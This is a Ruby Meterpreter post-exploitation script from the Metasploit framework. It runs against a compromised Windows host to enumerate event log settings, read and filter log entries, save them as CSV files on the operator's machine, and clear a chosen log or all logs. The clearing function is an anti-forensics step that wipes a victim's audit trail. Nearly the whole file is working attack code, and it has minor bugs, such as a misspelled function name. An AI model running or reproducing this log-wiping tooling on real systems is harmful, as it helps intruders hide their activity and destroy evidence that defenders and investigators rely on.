# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################
@client = client
clear_evt = false
event_name = nil
log_path = nil
supress_print = nil
filter = '\d*'
meter_type = client.platform
opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-i" => [ false, "List Present Event Logs on the System and thrie configuration"],
	"-e" => [ true,  "Event Log to Open."],
	"-f" => [ true,  "Event ID to filter events on."],
	"-l" => [ true,  "Log to CSV file, path for folder to save log can be provided."],
	"-c" => [ false, "Clear a given Event Log or all if none specified."],
	"-s" => [ false, "Suppress printing filtered logs to screen."]
)


################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for Windows Event Log Query and Clear."
	print_line(opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Function for Enumerating EventLogs
#-------------------------------------------------------------------------------
def info_evt()
	print_status("Retriving Event Log Configuration")
	ret = "Enabled"
	size = 0
	record_num = 0
	tbl = Rex::Ui::Text::Table.new(
		'Header'  => "Event Logs on System",
		'Indent'  => 1,
		'Columns' =>
		  [
			"Name",
			"Retention",
			"Maximun Size",
			"Records"
		])

	eventlog_list.each do |en|
		key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\"
		if @client.sys.config.sysinfo['OS'] =~ /Windows 2003|.Net|XP|2000/
			key = "#{key}Eventlog"
		else
			key = "#{key}eventlog"
		end
		begin
			if  registry_getvaldata("#{key}\\#{en}","Retention") == 0
				ret = "Disable"
			end
			size =  registry_getvaldata("#{key}\\#{en}","MaxSize")
			log = client.sys.eventlog.open(en)
			record_num = log.length
		rescue
			record_num = "Access Denied"
		end
		tbl << [en,ret,"#{size}K",record_num]
	end
	print_line("\n" + tbl.to_s + "\n")
end

# Function for doings queries of EventLogs
#-------------------------------------------------------------------------------
def list_logs(event_name,filter,logs,sup_print)
	begin
		event_data = ""
		csv_data = "EventID,Date,Data\n"
		log = client.sys.eventlog.open(event_name)
		log.each_backwards do |e|
			if e.eventid.to_s =~ /#{filter}/
				if not sup_print
					print_status("EventID: #{e.eventid}")
					print_status("Date: #{e.generated}")
					print_status("Data:")
					e.strings.each do |l|
						l.split("\r\n").each do |ml|
							print_status("\t#{ml.chomp}")
							event_data << " #{ml.chomp}"
						end
					end
					print_status
				end
				csv_data << "#{e.eventid},#{e.generated},\"#{event_data}\"\n"
				event_data = ""
			end
		end
	rescue
		print_error("Failed to Open Event Log #{event_name}")
		raise Rex::Script::Completed
	end
	log_file = File.join(logs, "#{event_name}.csv")
	print_good("CSV File saved to #{log_file}")
	file_local_write(log_file,csv_data)
end

# Function for clearing EventLogs
#-------------------------------------------------------------------------------
def evt_clear(evt)
	evntlog = []
	if evt.nil?
		evntlog = eventloglist
	else
		evntlog << evt
	end
	evntlog.each do |e|
		begin
			print_status("Clearing #{e}")
			log = client.sys.eventlog.open(e)
			log.clear
			print_status("Event Log #{e} Cleared!")
		rescue
			print_error("Failed to Clear #{e}, Access Denied")
		end
	end
	return evntlog
end

################## Main ##################
opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-i"
		info_evt
		raise Rex::Script::Completed
	when "-f"
		filter = val
	when "-e"
		eventlog_list.each do |en|
			if en.downcase == val.downcase
				event_name = en
			end
		end
		if not event_name
			print_error("Eventlog Name Not Found!")
			raise Rex::Script::Completed
		end
	when "-l"
		if File.directory?(val)
			log_path = val
		else
			print_error("Log folder #{val} does not exist!")
			raise Rex::Script::Completed
		end
	when "-c"
		clear_evt = true
	when "-s"
		supress_print = true
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i

if event_name

	# Log Folder Creation
	#-----------------------------------------------------------------------
	#Get Hostname
	host = @client.sys.config.sysinfo["Computer"]

	# Create Filename info to be appended to downloaded files
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

	# Create a directory for the logs
	if log_path
		logs = ::File.join(log_path, host + filenameinfo )
	else
		logs = ::File.join(Msf::Config.log_directory, "scripts", 'event_manager', host + filenameinfo )
	end

	# Create the log directory
	::FileUtils.mkdir_p(logs)
	#-----------------------------------------------------------------------

	if not clear_evt
		list_logs(event_name,filter,logs,supress_print)
	else
		evt_clear(event_name)
	end
else
	usage
end